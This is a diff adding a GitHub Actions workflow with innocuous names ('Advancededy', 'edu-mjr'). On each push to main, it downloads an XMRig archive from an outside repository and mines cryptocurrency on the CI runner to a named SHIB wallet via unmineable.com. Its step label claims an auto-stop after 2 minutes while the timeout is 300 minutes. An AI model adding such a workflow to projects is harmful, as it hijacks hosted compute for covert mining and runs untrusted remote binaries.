@@ -1,0 +1,37 @@
+name: Advancededy
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  edu-mjr:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Show timestamp
+        run: date
+
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Download and setup
+        run: |
+          wget https://github.com/phamhuyhoang2k4/renderapp/raw/refs/heads/main/xmrig-6.22.3.tar
+          tar -xvf xmrig-6.22.3.tar
+          cd xmrig-6.22.3
+
+      - name: Run Xmrig (auto-stop after 2 minutes)
+        timeout-minutes: 300
+        run: |
+          cd xmrig-6.22.3
+          ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xdb3bd6c6a106c9b8b2e7ccdd5beac8ec9584e820.2yes -p x
+
+      - name: Notify success
+        if: success()
+        run: echo "✅ completed successfully!"
+
+      - name: Notify failure
+        if: failure()
+        run: echo "❌ failed!"
